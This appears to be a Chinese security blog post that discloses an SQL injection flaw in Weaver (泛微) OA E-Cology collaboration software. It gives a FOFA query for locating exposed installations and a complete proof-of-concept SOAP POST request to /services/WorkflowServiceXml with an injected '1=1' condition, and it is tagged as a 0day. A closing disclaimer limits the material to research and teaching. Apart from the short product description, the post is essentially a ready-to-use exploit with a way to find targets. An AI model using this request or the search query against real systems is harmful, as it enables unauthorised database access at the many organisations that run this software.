#  泛微OA E-Cology存在SQL注入漏洞   
原创 Swimt  星悦安全   2024-07-13 13:42  
  
**漏洞简介**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
****  
**泛微OA是一款协同管理软件，由泛微网络科技股份有限公司开发。该软件已被七万多家中大型组织选用，是国内协同OA办公领域领导品牌之一.**  
  
****  
**资产详情**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
```
Fofa:app="泛微-OA（e-cology）"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ficbDfliaoZTPE2wuGU4IEqz8TGnDHQMZ8JFy8hF3F0DSFORHhcmxgcMq5xFPAShmU8mVTnuahVcog/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ficbDfliaoZTPE2wuGU4IEqzsM6WicbEyE83nKoNx7nnp9FWGibHEQ85pDkYRIIb3I9b57RYhR7lX8Sg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**漏洞复现**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**Payload:**  
```
POST /services/WorkflowServiceXml HTTP/1.1
Host: 127.0.0.1:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: text/xml
Accept-Encoding: gzip
Content-Length: 487

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/>
  <soapenv:Body>
      <web:getHendledWorkflowRequestList>
        <web:in0>1</web:in0>
        <web:in1>1</web:in1>
        <web:in2>1</web:in2>
        <web:in3>1</web:in3>
        <web:in4>
            <web:string>1=1</web:string>
        </web:in4>
      </web:getHendledWorkflowRequestList>
  </soapenv:Body>
</soapenv:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ficbDfliaoZTPE2wuGU4IEqzJeLMumgdicibbwBic507icUcXa8B2GafYiabf3ZjIllibHly9ZEwkiaZ9x2XQ/640?wx_fmt=png&from=appmsg "")  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，公众号，源码，回调，OA，协同办公**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**免责声明**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/HVNK6rZ71oofHnCicjcYq2y5pSeBUgibJg8K4djZgn6iaWb6NGmqxIhX2oPlRmGe6Yk0xBODwnibFF8XCjxhEV3K7w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
    **文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
